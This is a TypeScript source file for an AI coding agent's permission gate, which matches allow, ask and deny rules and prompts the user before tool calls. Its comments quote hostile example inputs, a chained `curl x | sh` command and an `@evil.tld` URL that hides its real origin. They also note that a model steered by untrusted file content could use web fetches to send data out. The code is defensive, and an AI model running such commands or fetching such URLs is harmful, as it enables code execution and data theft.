import type { Permission } from "./config/config.ts"

export class PermissionDenied extends Error {
  constructor(tool: string) {
    super(`permission denied for ${tool}`)
  }
}

export type PermissionRequest = {
  tool: string
  /** One-line summary shown in the prompt, e.g. `edit src/app.ts`. */
  title: string
  /** Optional body: a diff, the command about to run, etc. */
  detail?: string
  /** How to render `detail`. A unified patch gets the real diff view. */
  detailKind?: "diff" | "text"
  /**
   * Extra specificity for rule matching. For `bash` this is the command, so
   * `"bash:git "` in the config can allow a family of commands (but never a chained one,
   * see `prefixMatches`).
   */
  subject?: string
  /**
   * The tool call this request belongs to. Only the UI uses it: a model that batches three
   * edits into one step has three calls in flight at once, so "the running one" is not a
   * thing an observer can work out on its own.
   */
  callID?: string
}

export type PermissionAnswer = "once" | "always" | "reject"
export type PermissionAsker = (request: PermissionRequest) => Promise<PermissionAnswer>

/** Anything that lets one shell command run another: `;`, `&`, `|`, `$(…)`, backticks, redirects, newlines. */
const SHELL_CHAIN = /[;&|$`<>\n\r]/

/**
 * Whether a `tool:prefix` rule covers `subject`. For an `allow` rule a plain prefix is not
 * enough on the two tools whose subject an attacker can shape: `"bash:git "` must not allow
 * `git status; curl x | sh`, and `"webfetch:https://docs."` must not allow
 * `https://docs.attacker.tld`. So an allowing bash prefix only matches a command with no
 * chaining in it, and an allowing webfetch prefix only once it spells out the whole origin.
 * `ask` and `deny` rules keep plain prefix matching, so they never get weaker.
 */
export function prefixMatches(tool: string, prefix: string, subject: string, permission: Permission): boolean {
  if (!subject.startsWith(prefix)) return false
  if (permission !== "allow") return true
  if (tool === "bash") return !SHELL_CHAIN.test(subject.slice(prefix.length))
  if (tool === "webfetch") {
    try {
      // `https://docs.example.com@evil.tld/` starts with the prefix but its origin is evil.tld.
      const { origin } = new URL(subject)
      return subject.startsWith(origin) && prefix.length >= origin.length
    } catch {
      return false
    }
  }
  return true
}

/**
 * Picks the most specific matching rule. Keys are either a tool name (`bash`) or
 * `tool:prefix` (`bash:git `), and the longest matching prefix wins.
 */
export function resolvePermission(
  rules: Record<string, Permission>,
  request: PermissionRequest,
  fallback: Permission = "allow",
): Permission {
  let best: { length: number; permission: Permission } | undefined
  for (const [key, permission] of Object.entries(rules)) {
    const colon = key.indexOf(":")
    const tool = colon === -1 ? key : key.slice(0, colon)
    const prefix = colon === -1 ? "" : key.slice(colon + 1)
    if (tool !== request.tool && tool !== "*") continue
    if (prefix && !prefixMatches(request.tool, prefix, request.subject ?? "", permission)) continue
    const length = prefix.length + (tool === "*" ? 0 : 1)
    if (!best || length > best.length) best = { length, permission }
  }
  return best?.permission ?? fallback
}

/**
 * Anything that mutates the workspace asks unless the user opts out. `mcp` covers every
 * MCP tool: third-party code whose side effects jarvis cannot inspect, so it asks by
 * default. Custom `.jarvis/tools` are the user's own code and fall through to `allow`.
 */
export const DEFAULT_RULES: Record<string, Permission> = {
  write: "ask",
  edit: "ask",
  bash: "ask",
  task: "allow",
  mcp: "ask",
  // The URL comes from the model, which may have read it out of untrusted file content, so
  // an unprompted fetch is an exfiltration path. Allow a host with its full origin,
  // `"webfetch:https://docs.example.com/"`, rather than opening it wholesale.
  webfetch: "ask",
  // Both send data off the machine: a repo to the cloud or a git remote, a camera frame to
  // the cloud. Anything the model read can steer them, so they ask like webfetch does.
  code_project: "ask",
  find_item: "ask",
}

/**
 * Lets a plugin decide a request before the user is asked. Injected rather than
 * imported so `permission.ts` stays free of plugin machinery.
 */
export type PermissionOverride = (request: PermissionRequest) => Promise<Permission | undefined>

/**
 * The single approval gate. Every tool that touches the outside world routes
 * through `check`, so policy lives in one place instead of per-tool.
 */
export class PermissionGate {
  private readonly rules: Record<string, Permission>

  constructor(
    rules: Record<string, Permission>,
    private readonly asker: PermissionAsker,
    /** Shared with derived gates so "always allow" survives agent and turn changes. */
    private readonly granted = new Set<string>(),
    private readonly override?: PermissionOverride,
    /** Called when the user answers "always", for callers that want to persist it. */
    private readonly onGrant?: (request: PermissionRequest) => void,
    /**
     * Every request that reaches the gate, decided or not. The UI uses it to keep the diff
     * a tool built for the prompt; nothing here may depend on it, and it must not throw.
     */
    private readonly observe?: (request: PermissionRequest) => void,
  ) {
    this.rules = { ...DEFAULT_RULES, ...rules }
  }

  /** Agent-level overrides layered on top of the config rules. */
  withRules(overrides: Record<string, Permission>) {
    const rules = { ...this.rules, ...overrides }
    return new PermissionGate(rules, this.asker, this.granted, this.override, this.onGrant, this.observe)
  }

  /** Attaches a plugin decider; keeps the same rules, asker and grants. */
  withOverride(override: PermissionOverride) {
    return new PermissionGate(this.rules, this.asker, this.granted, override, this.onGrant, this.observe)
  }

  async check(request: PermissionRequest): Promise<void> {
    // Before any decision: an allowed tool returns below without ever reaching the asker,
    // and an observer that only saw prompts would show nothing once you allow `edit`.
    this.observe?.(request)
    const permission = (await this.override?.(request)) ?? resolvePermission(this.rules, request)
    if (permission === "deny") throw new PermissionDenied(request.tool)
    if (permission === "allow") return
    const key = `${request.tool}:${request.subject ?? ""}`
    if (this.granted.has(key)) return
    const answer = await this.asker(request)
    if (answer === "reject") throw new PermissionDenied(request.tool)
    if (answer === "always") {
      this.granted.add(key)
      this.onGrant?.(request)
    }
  }
}

/** Headless asker: approves everything, or rejects everything. */
export const constantAsker = (allow: boolean): PermissionAsker => async () => (allow ? "always" : "reject")
